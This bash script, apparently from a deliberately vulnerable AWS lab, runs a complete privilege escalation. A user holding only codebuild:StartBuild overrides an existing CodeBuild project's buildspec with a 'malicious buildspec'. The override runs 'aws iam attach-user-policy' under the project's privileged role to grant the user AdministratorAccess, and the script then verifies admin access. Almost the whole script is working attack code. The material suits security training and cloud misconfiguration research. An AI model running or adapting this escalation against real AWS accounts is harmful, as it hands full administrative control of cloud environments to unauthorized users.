#!/bin/bash

# Demo script for codebuild:StartBuild privilege escalation
# This script demonstrates how a user with StartBuild can exploit an existing CodeBuild project

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
STARTING_USER="pl-prod-codebuild-002-to-admin-starting-user"
EXISTING_PROJECT="pl-prod-codebuild-002-to-admin-existing-project"
PROJECT_ROLE="pl-prod-codebuild-002-to-admin-project-role"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}CodeBuild StartBuild Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_codebuild_002_codebuild_startbuild.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials from the grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Step 2: Configure AWS credentials with starting user
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
export AWS_REGION=$AWS_REGION
unset AWS_SESSION_TOKEN

echo "Using region: $AWS_REGION"

# Verify starting user identity
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# Step 4: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
echo "Attempting to list IAM users (should fail)..."
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# Step 5: Discover existing CodeBuild projects
echo -e "${YELLOW}Step 5: Discovering CodeBuild projects${NC}"
echo "Listing CodeBuild projects in the account..."

PROJECT_LIST=$(aws codebuild list-projects \
    --region $AWS_REGION \
    --query 'projects[*]' \
    --output json)

echo "Found CodeBuild projects:"
echo "$PROJECT_LIST" | jq -r '.[]'

if echo "$PROJECT_LIST" | jq -r '.[]' | grep -q "$EXISTING_PROJECT"; then
    echo -e "${GREEN}✓ Found target project: $EXISTING_PROJECT${NC}"
else
    echo -e "${RED}Error: Could not find target project${NC}"
    exit 1
fi
echo ""

# Step 6: Inspect the existing project
echo -e "${YELLOW}Step 6: Inspecting the existing CodeBuild project${NC}"
echo "Getting project details for: $EXISTING_PROJECT"

PROJECT_DETAILS=$(aws codebuild batch-get-projects \
    --region $AWS_REGION \
    --names "$EXISTING_PROJECT" \
    --output json)

PROJECT_ROLE_ARN=$(echo "$PROJECT_DETAILS" | jq -r '.projects[0].serviceRole')
echo "Project service role: $PROJECT_ROLE_ARN"

if [[ $PROJECT_ROLE_ARN == *"$PROJECT_ROLE"* ]]; then
    echo -e "${GREEN}✓ Project is using a privileged role!${NC}"
    echo "This role likely has elevated permissions we can exploit"
else
    echo -e "${YELLOW}Warning: Role name doesn't match expected pattern${NC}"
fi
echo ""

# Step 7: Create malicious buildspec
echo -e "${YELLOW}Step 7: Preparing malicious buildspec${NC}"
echo "Creating buildspec that will attach AdministratorAccess policy to our user..."

# Create buildspec that will be used to override the existing project's buildspec
MALICIOUS_BUILDSPEC=$(cat <<EOF
version: 0.2
phases:
  build:
    commands:
      - echo "Starting privilege escalation via buildspec override..."
      - aws iam attach-user-policy --user-name $STARTING_USER --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
      - echo "Successfully attached AdministratorAccess policy to $STARTING_USER"
EOF
)

echo -e "${BLUE}Malicious buildspec contents:${NC}"
echo "$MALICIOUS_BUILDSPEC"
echo -e "${GREEN}✓ Buildspec prepared${NC}\n"

# Step 8: Start build with buildspec override
echo -e "${YELLOW}Step 8: Starting build with buildspec override${NC}"
echo "Using codebuild:StartBuild with --buildspec-override parameter..."
echo "Project: $EXISTING_PROJECT"

BUILD_RESULT=$(aws codebuild start-build \
    --region $AWS_REGION \
    --project-name "$EXISTING_PROJECT" \
    --buildspec-override "$MALICIOUS_BUILDSPEC" \
    --output json)

if [ $? -eq 0 ]; then
    BUILD_ID=$(echo "$BUILD_RESULT" | jq -r '.build.id')
    BUILD_STATUS=$(echo "$BUILD_RESULT" | jq -r '.build.buildStatus')
    echo "Build ID: $BUILD_ID"
    echo "Initial Status: $BUILD_STATUS"
    echo -e "${GREEN}✓ Build started successfully with overridden buildspec${NC}"
else
    echo -e "${RED}Error: Failed to start build${NC}"
    exit 1
fi
echo ""

# Step 9: Wait for the build to complete
echo -e "${YELLOW}Step 9: Waiting for build to complete and policy to propagate${NC}"
echo "This may take 30-60 seconds for the build to run and IAM changes to take effect..."

# Wait for build to complete
WAIT_TIME=0
MAX_WAIT=120
while [ $WAIT_TIME -lt $MAX_WAIT ]; do
    BUILD_STATUS=$(aws codebuild batch-get-builds \
        --region $AWS_REGION \
        --ids "$BUILD_ID" \
        --query 'builds[0].buildStatus' \
        --output text)

    echo "Build status: $BUILD_STATUS (waited ${WAIT_TIME}s)"

    if [ "$BUILD_STATUS" = "SUCCEEDED" ]; then
        echo -e "${GREEN}✓ Build completed successfully${NC}"
        break
    elif [ "$BUILD_STATUS" = "FAILED" ] || [ "$BUILD_STATUS" = "FAULT" ] || [ "$BUILD_STATUS" = "TIMED_OUT" ] || [ "$BUILD_STATUS" = "STOPPED" ]; then
        echo -e "${RED}Build failed with status: $BUILD_STATUS${NC}"
        echo "Check CodeBuild logs for details"
        exit 1
    fi

    sleep 10
    WAIT_TIME=$((WAIT_TIME + 10))
done

if [ $WAIT_TIME -ge $MAX_WAIT ]; then
    echo -e "${RED}Build did not complete within ${MAX_WAIT} seconds${NC}"
    exit 1
fi

# Additional wait for IAM propagation
echo ""
echo -e "${YELLOW}Waiting additional 15 seconds for IAM policy propagation...${NC}"
sleep 15
echo -e "${GREEN}✓ Policy should be propagated${NC}\n"

# Step 10: Verify admin access
echo -e "${YELLOW}Step 10: Verifying administrator access${NC}"
echo "Attempting to list IAM users..."

if aws iam list-users --max-items 3 --output table; then
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}✗ Failed to list users${NC}"
    echo "Note: IAM policy changes can take a few minutes to fully propagate"
    echo "You may need to wait a bit longer and try again"
    exit 1
fi
echo ""

# Summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (with codebuild:StartBuild)"
echo "2. Discovered existing CodeBuild project: $EXISTING_PROJECT"
echo "3. Identified project uses privileged role: $PROJECT_ROLE"
echo "4. Created malicious buildspec to attach AdministratorAccess"
echo "5. Started build with --buildspec-override parameter"
echo "6. Buildspec executed with admin role's permissions"
echo "7. Successfully attached AdministratorAccess policy to $STARTING_USER"
echo "8. Achieved: Administrator Access"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER → (codebuild:StartBuild with buildspec-override)"
echo -e "  → $EXISTING_PROJECT with $PROJECT_ROLE"
echo -e "  → Buildspec executes with admin permissions"
echo -e "  → Attach AdministratorAccess to $STARTING_USER → Admin"

echo -e "\n${YELLOW}Key Technique:${NC}"
echo "The --buildspec-override parameter allows overriding the project's buildspec"
echo "If the user lacks iam:PassRole, they can't create new projects, but can still"
echo "exploit existing projects by overriding their buildspec at build start time"

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- Build ID: $BUILD_ID"
echo "- AdministratorAccess policy attached to: $STARTING_USER"

echo -e "\n${RED}⚠ Warning: The policy attachment remains${NC}"
echo ""
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""
